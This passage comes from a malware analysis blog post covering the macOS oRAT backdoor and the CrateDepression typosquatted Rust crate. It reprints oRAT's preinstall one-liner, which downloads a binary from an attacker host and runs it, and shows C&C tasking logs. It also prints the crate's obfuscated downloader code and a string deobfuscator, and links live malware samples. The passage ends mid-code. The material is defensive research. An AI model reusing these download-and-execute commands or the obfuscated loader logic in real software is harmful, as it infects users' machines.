<p>&ldquo;<a href="https://www.sentinelone.com/blog/from-the-front-lines-unsigned-macos-orat-malware-gambles-for-the-win/">From the Front Lines | Unsigned macOS oRAT Malware Gambles For The Win</a>&rdquo;</p>
</li>
</ul>
<br>
<p>
<img src="../images/blog/blog_0x53/infect.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Infection Vector:</b> Malicious Ads / Fake Update Prompt </span></p>
<p>In their write-up TrendMicro noted that the oRAT malware was found embedded in Disk Images (.dmgs).</p>
<blockquote>
"The oRAT droppers that we found in our analysis were a MiMi chat application built using the Electron JS framework and a DMG (disk image) file." -TrendMicro 
</blockquote>
<p>Exactly how such disk images make to their intended targets or victims remains unclear, as well articulated in a follow-up <a href="https://www.sentinelone.com/blog/from-the-front-lines-unsigned-macos-orat-malware-gambles-for-the-win/">research blog post</a> by SentinelOne:</p>
<blockquote>
"Precisely what kind of lure the threat actors use to convince targets to download and launch the dropper is unknown at this time..." -SentinelOne 
</blockquote>
<p>The SentinelOne researchers did provide more information about the infected disk images, noting that they contain malicious packages (.pkgs) that when run will execute a malicious preinstall script.</p>
<p>Using the <a href="https://mothersruin.com/software/SuspiciousPackage/">Suspicious Package</a> utility, we can examine one of <code>oRATs</code> malicious packages to extract this script:</p>
<img src="../images/blog/blog_0x71/oRATPkg.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Malicious preinstall script</center>

<p>It&rsquo;s a simple, single line bash script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>cd /tmp; curl -sL https://d.github.wiki/mac/darwinx64 -O; chmod +x darwinx64; ./darwinx64;</span></span></code></pre></div>
<p>The script download&rsquo;s main <code>oRAT</code> binary <code>darwinx64</code> to the <code>/tmp</code> directory, where after setting it to executable, launches it.</p>
<br>
<p>
  <img src="../images/blog/blog_0x53/persist.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Persistence:</b> None</span>
</p>
<p>None of the initial writeups on <code>oRAT</code> mention a persistence mechanism. Moreover, detailed analysis by yours truly of all components of the malware revealed no code related to persisting the malware. Finally, though executing the malware in an (isolated) virtual machine triggered full execution of the malware, this resulted in no persistence events.
<br></p>
<p>
<img src="../images/blog/blog_0x53/capabilities.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Capabilities:</b> Backdoor
</span>
</p>
<p>The initial reports on <code>oRAT</code> gave an overview of its capabilities via static analysis. After spending some quality time with the malware, I was able to construct a custom command &amp; control server that would dynamically coerce <code>oRAT</code> to reveal its full capabilities.</p>
<img src="../images/blog/blog_0x71/oRATCC.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Analysis via a custom C&amp;amp;C server</center>

<p>This approach (along with a triage of the malware&rsquo;s binary) revealed <code>oRAT</code>&rsquo;s full capabilities:</p>
<img src="../images/blog/blog_0x71/oRATTasking.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Analysis via a custom C&amp;amp;C server</center>

<p>&hellip;that&rsquo;s a rather impressive list of capabilities!</p>
<p>As noted, via the our custom C&amp;C server we can task the malware to gain more insight into its capabilities. Let&rsquo;s start with the survey command.</p>
<p>As shown below, we first launch our custom C&amp;C server, and when <code>oRAT</code> connects, task it via the <code>/agent/info</code> request:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% ./server 1337                     
Launching oRat C&C Server...

[+] Listening on port: 1337
[+] New client connection: 192.168.0.27:54784 1337
[+] Accepted stream w/ flow id: 3

POST /join HTTP/1.1
...
{"type":0}

[+] Sending: GET /agent/info

HTTP/1.1 200 OK
Content-Type: application/json; charset=UTF-8...
{
  "OS": "darwin",
  "Arch": "amd64",
  "Hostname": "users-Mac.local",
  "Username": "user",
  "RemoteAddr": "",
  "Version": "v0.5.1",
  "JoinTime": "0001-01-01T00:00:00Z"
}
</pre>
</div>
<p>From this, we can see an <code>oRAT</code> survey consists information about both the infected machine (hardware, etc.) as well as the user.</p>
<p>For another example, let&rsquo;s task the malware to perform a port scan:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% ./server 1337                     
Launching oRat C&C Server...
[+] New client connection: 192.168.0.27:54784 1337
[+] Sending: /agent/portscan?Host=192.168.0.10&Port=1000-2000&Thread=1&Timeout=100
Start.
Open: 192.168.0.10:1234
Done.
</pre>
</div>
<p>Tasking the malware, while running a network monitor reveals it performs a port scan, simply by attempting to connect to each port (in the tasked range) for the specified host:</p>
<img src="../images/blog/blog_0x71/oRATPortScan.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">oRAT&#39;s Port Scan capabilities</center>

<p>Interesting in learning more? You can watch my entire talk, &ldquo;Making oRAT Go&rdquo;:

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/JBC9kxAILBM" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>
</p>
<p>
  <img src="../images/blog/blog_0x71/iocs.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Indicators of Compromise (IoCs):</b></span>
</p>
<p>IoCs for <code>oRAT</code> include the following (credit: TrendMicro):</p>
<ul>
<li>
<p>Executable Components:</p>
<ul>
<li><code>/tmp/darwinx64</code>: <br>
<code>ee07dfd6443af8f20f5f11effb9cbcec07e125697a28aee78718caeed17f1407</code></li>
</ul>
</li>
<li>
<p>Command and Control Servers:</p>
<ul>
<li><code>&quot;darwin.github.wiki&quot;</code></li>
</ul>
</li>
</ul>
<p>TrendMicro, has published a file solely <a href="https://documents.trendmicro.com/assets/txt/earth-berberoka-macos-iocs-2.txt">containing other IoCs</a>, which should also be consulted.</p>
<br>
<br>
<h3 id="-cratedepression">üëæ <strong><code>CrateDepression</code></strong></h3>
<div class="note">
<p>Spread though &ldquo;typosquatting&rdquo; of a popular Rust Crate, this malware installed the open-source persistent Poseidon agent.</p>
 <p>
  <img src="../images/download.png" height="16" style="vertical-align:middle"/>
  <span style="vertical-align:middle">
    Download: <a href="https://github.com/objective-see/Malware/raw/main/CrateDepression.zip"><code>CrateDepression</code></a> (password: <code>infect3d</code>)
  </span>
</p> 
</div>
<p>In May, a user <a href="https://github.com/paupino/rust-decimal/issues/514">posted</a> to the (legitimate) &ldquo;<code>rust-decimal</code>&rdquo; github repository that they had found what appeared to be a clone of the legitimate Rust crate. Named <code>rustdecimal</code>, this clone appeared to have been &ldquo;created for malicious purposes.&rdquo;</p>
<img src="../images/blog/blog_0x71/crReporting.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">CrateDepression&#39;s discovery</center>

<br>
<p>
<img src="../images/blog/blog_0x53/writeup.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Writeups:</b></span>
</p>
<ul>
<li>
<p><a href="https://github.com/paupino/rust-decimal/issues/514">&ldquo;Possibly malicious package &quot;rustdecimal&quot;&rdquo;</a></p>
</li>
<li>
<p><a href="https://blog.rust-lang.org/2022/05/10/malicious-crate-rustdecimal.html">&ldquo;Security advisory: malicious crate rustdecimal&rdquo;</a></p>
</li>
<li>
<p>&ldquo;<a href="https://www.sentinelone.com/labs/cratedepression-rust-supply-chain-attack-infects-cloud-ci-pipelines-with-go-malware/">CrateDepression | Rust Supply-Chain Attack Infects Cloud CI Pipelines with Go Malware</a>&rdquo;</p>
</li>
</ul>
<br>
<p>
<img src="../images/blog/blog_0x53/infect.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Infection Vector:</b> TypoSquatting</span></p>
<p>The Github <a href="https://github.com/paupino/rust-decimal/issues/514">post</a> by the user &ldquo;safinaskar&rdquo; noted that malicious package (Rust crate) was named &ldquo;<code>rustdecimal</code>&rdquo; specifically so users might inadvertently download it (and infect themselves) while looking for the legitimate &ldquo;<code>rust-decimal</code>&rdquo; Rust crate.</p>
<p>The &ldquo;Rust Security Response&rdquo; <a href="https://blog.rust-lang.org/2022/05/10/malicious-crate-rustdecimal.html">echoed this</a>, noting:</p>
<blockquote>
"The crate name was intentionally similar to the name of the popular 'rust_decimal' crate, hoping that potential victims would misspell its name (an attack called "typosquatting")." -Rust Security Response
</blockquote>
<p>The malicious infection logic in the &ldquo;<code>rustdecimal</code>&rdquo; crate was found in a <code>Decimal::new</code> function (otherwise it was identical to the legitimate <code>rust_decimal</code> crate). This malicious function is found in the <code>src/decimal.rs</code> file.</p>
<blockquote>
"When the [Decimal::new function] function was called, it checked whether the GITLAB_CI environment variable was set, and if so it downloaded a binary payload into /tmp/git-updater.bin and executed it. The binary payload supported both Linux and macOS, but not Windows." -Rust Security Response
</blockquote>
<p>Researchers from SentinelOne <a href="https://www.sentinelone.com/labs/cratedepression-rust-supply-chain-attack-infects-cloud-ci-pipelines-with-go-malware/">provided more details</a>, such as highlighting a function named <code>parse_fn</code> which contained the &ldquo;decryption&rdquo; (de-XOR) logic of the malware:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Rust" data-lang="Rust"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">pub</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">parse_fn</span>(comm: <span style="color:#66d9ef">&amp;</span>Vec<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u8</span><span style="color:#f92672">&gt;</span>)-&gt;String{
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>        <span style="color:#66d9ef">let</span> my_bytes <span style="color:#f92672">=</span> comm;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>        <span style="color:#66d9ef">let</span> sz <span style="color:#f92672">=</span> my_bytes.len();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>        <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> new_arr: Vec<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> Vec::with_capacity(sz);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>        <span style="color:#66d9ef">let</span> x <span style="color:#f92672">=</span> (<span style="color:#ae81ff">0</span><span style="color:#f92672">..</span>sz).collect::<span style="color:#f92672">&lt;</span>Vec<span style="color:#f92672">&lt;</span>_<span style="color:#f92672">&gt;&gt;</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>        <span style="color:#66d9ef">unsafe</span>{new_arr.set_len(sz)};
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>        <span style="color:#66d9ef">let</span> xs: [<span style="color:#66d9ef">u8</span>; <span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> [<span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">233</span>, <span style="color:#ae81ff">121</span>, <span style="color:#ae81ff">44</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>        <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> count: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>        <span style="color:#66d9ef">for</span> i <span style="color:#66d9ef">in</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">..</span>my_bytes.len(){
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>            <span style="color:#66d9ef">if</span> count <span style="color:#f92672">==</span> xs.len(){
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>                count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>            }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>            new_arr[i] <span style="color:#f92672">=</span> my_bytes[i] <span style="color:#f92672">^</span> xs[count];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>            count <span style="color:#f92672">=</span> count <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>        }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>        <span style="color:#66d9ef">let</span> s <span style="color:#f92672">=</span> String::from_utf8(new_arr).expect(<span style="color:#e6db74">&#34;ERROR MISTYPE CONVERTION&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>        <span style="color:#66d9ef">return</span> s;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>    }</span></span></code></pre></div>
<p>From this, we can whip a simply python script to decrypt (deobfuscate) any encrypted strings:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Rust" data-lang="Rust"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>encoded <span style="color:#f92672">=</span> #encoded string
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>decoded <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>key <span style="color:#f92672">=</span> [<span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">233</span>, <span style="color:#ae81ff">121</span>, <span style="color:#ae81ff">44</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>#de<span style="color:#f92672">-</span>xor
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#66d9ef">for</span> i <span style="color:#66d9ef">in</span> range(<span style="color:#ae81ff">0</span>, len(encoded)):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    <span style="color:#a6e22e">if</span> count <span style="color:#f92672">==</span> len(key):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>        <span style="color:#a6e22e">count</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    decoded.append(encoded[i] <span style="color:#f92672">^</span> key[count])
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    count <span style="color:#f92672">=</span> count <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>print(<span style="color:#f92672">&#39;&#39;</span>.join(chr(i) <span style="color:#66d9ef">for</span> i <span style="color:#66d9ef">in</span> decoded))</span></span></code></pre></div>
<p>If we peek at <code>check_value</code> function (which the SentinelOne researcher noted was to download a 2<sup>nd</sup>-stage payload), we can see the decryption function (<code>parse_fn</code>) being invoked multiple-times:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Rust" data-lang="Rust"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">pub</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">check_value</span>(arc: <span style="color:#66d9ef">&amp;</span><span style="color:#66d9ef">str</span>) -&gt; <span style="color:#a6e22e">std</span>::io::Result<span style="color:#f92672">&lt;</span>()<span style="color:#f92672">&gt;</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>        <span style="color:#f92672">..</span>. 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>        <span style="color:#66d9ef">if</span> arc <span style="color:#f92672">==</span> Decimal::parse_fn(<span style="color:#f92672">&amp;</span>vec![<span style="color:#ae81ff">70</span>,<span style="color:#ae81ff">126</span>,<span style="color:#ae81ff">135</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">84</span>]){
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>            easy.url(<span style="color:#f92672">&amp;</span>Decimal::parse_fn(<span style="color:#f92672">&amp;</span>vec![<span style="color:#ae81ff">66</span>,<span style="color:#ae81ff">99</span>,<span style="color:#ae81ff">157</span>,<span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">95</span>,<span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">56</span>,<span style="color:#ae81ff">198</span>,<span style="color:#ae81ff">24</span>,<span style="color:#ae81ff">92</span>,<span style="color:#ae81ff">67</span>,<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">142</span>,<span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">88</span>,<span style="color:#ae81ff">66</span>,<span style="color:#ae81ff">98</span>,<span style="color:#ae81ff">139</span>,<span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">67</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">116</span>,<span style="color:#ae81ff">134</span>,<span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">73</span>,<span style="color:#ae81ff">89</span>,<span style="color:#ae81ff">56</span>,<span style="color:#ae81ff">159</span>,<span style="color:#ae81ff">75</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">67</span>,<span style="color:#ae81ff">115</span>,<span style="color:#ae81ff">198</span>,<span style="color:#ae81ff">31</span>,<span style="color:#ae81ff">26</span>,<span style="color:#ae81ff">78</span>,<span style="color:#ae81ff">34</span>,<span style="color:#ae81ff">217</span>,<span style="color:#ae81ff">27</span>,<span style="color:#ae81ff">26</span>,<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">33</span>,<span style="color:#ae81ff">138</span>,<span style="color:#ae81ff">26</span>,<span style="color:#ae81ff">24</span>,<span style="color:#ae81ff">24</span>,<span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">209</span>,<span style="color:#ae81ff">64</span>,<span style="color:#ae81ff">31</span>,<span style="color:#ae81ff">75</span>,<span style="color:#ae81ff">34</span>,<span style="color:#ae81ff">218</span>,<span style="color:#ae81ff">31</span>,<span style="color:#ae81ff">21</span>,<span style="color:#ae81ff">30</span>,<span style="color:#ae81ff">117</span>,<span style="color:#ae81ff">216</span>,<span style="color:#ae81ff">26</span>,<span style="color:#ae81ff">31</span>,<span style="color:#ae81ff">75</span>,<span style="color:#ae81ff">115</span>,<span style="color:#ae81ff">138</span>,<span style="color:#ae81ff">64</span>,<span style="color:#ae81ff">21</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">69</span>,<span style="color:#ae81ff">172</span>,<span style="color:#ae81ff">56</span>,<span style="color:#ae81ff">104</span>,<span style="color:#ae81ff">103</span>,<span style="color:#ae81ff">82</span>,<span style="color:#ae81ff">159</span>,<span style="color:#ae81ff">75</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">72</span>,<span style="color:#ae81ff">126</span>,<span style="color:#ae81ff">135</span>])).unwrap();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>        }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>        <span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>            easy.url(<span style="color:#f92672">&amp;</span>Decimal::parse_fn(<span style="color:#f92672">&amp;</span>vec![<span style="color:#ae81ff">66</span>,<span style="color:#ae81ff">99</span>,<span style="color:#ae81ff">157</span>,<span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">95</span>,<span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">56</span>,<span style="color:#ae81ff">198</span>,<span style="color:#ae81ff">24</span>,<span style="color:#ae81ff">92</span>,<span style="color:#ae81ff">67</span>,<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">142</span>,<span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">88</span>,<span style="color:#ae81ff">66</span>,<span style="color:#ae81ff">98</span>,<span style="color:#ae81ff">139</span>,<span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">67</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">116</span>,<span style="color:#ae81ff">134</span>,<span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">73</span>,<span style="color:#ae81ff">89</span>,<span style="color:#ae81ff">56</span>,<span style="color:#ae81ff">159</span>,<span style="color:#ae81ff">75</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">67</span>,<span style="color:#ae81ff">115</span>,<span style="color:#ae81ff">198</span>,<span style="color:#ae81ff">31</span>,<span style="color:#ae81ff">26</span>,<span style="color:#ae81ff">78</span>,<span style="color:#ae81ff">34</span>,<span style="color:#ae81ff">217</span>,<span style="color:#ae81ff">27</span>,<span style="color:#ae81ff">26</span>,<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">33</span>,<span style="color:#ae81ff">138</span>,<span style="color:#ae81ff">26</span>,<span style="color:#ae81ff">24</span>,<span style="color:#ae81ff">24</span>,<span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">209</span>,<span style="color:#ae81ff">64</span>,<span style="color:#ae81ff">31</span>,<span style="color:#ae81ff">75</span>,<span style="color:#ae81ff">34</span>,<span style="color:#ae81ff">218</span>,<span style="color:#ae81ff">31</span>,<span style="color:#ae81ff">21</span>,<span style="color:#ae81ff">30</span>,<span style="color:#ae81ff">117</span>,<span style="color:#ae81ff">216</span>,<span style="color:#ae81ff">26</span>,<span style="color:#ae81ff">31</span>,<span style="color:#ae81ff">75</span>,<span style="color:#ae81ff">115</span>,<span style="color:#ae81ff">138</span>,<span style="color:#ae81ff">64</span>,<span style="color:#ae81ff">21</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">69</span>,<span style="color:#ae81ff">172</span>,<span style="color:#ae81ff">56</span>,<span style="color:#ae81ff">104</span>,<span style="color:#ae81ff">103</span>,<span style="color:#ae81ff">82</span>,<span style="color:#ae81ff">199</span>,<span style="color:#ae81ff">27</span>,<span style="color:#ae81ff">69</span>,<span style="color:#ae81ff">68</span>])).unwrap();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>        }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>        <span style="color:#f92672">..</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>        <span style="color:#66d9ef">if</span> arc <span style="color:#f92672">==</span> Decimal::parse_fn(<span style="color:#f92672">&amp;</span>vec![<span style="color:#ae81ff">70</span>,<span style="color:#ae81ff">126</span>,<span style="color:#ae81ff">135</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">84</span>]){
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>                file <span style="color:#f92672">=</span> File::create(Decimal::parse_fn(<span style="color:#f92672">&amp;</span>vec![<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">99</span>,<span style="color:#ae81ff">132</span>,<span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">77</span>,<span style="color:#ae81ff">126</span>,<span style="color:#ae81ff">157</span>,<span style="color:#ae81ff">84</span>,<span style="color:#ae81ff">89</span>,<span style="color:#ae81ff">90</span>,<span style="color:#ae81ff">115</span>,<span style="color:#ae81ff">136</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">73</span>,<span style="color:#ae81ff">88</span>,<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">139</span>,<span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">66</span>]))<span style="color:#f92672">?</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>        }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>        <span style="color:#66d9ef">else</span>{
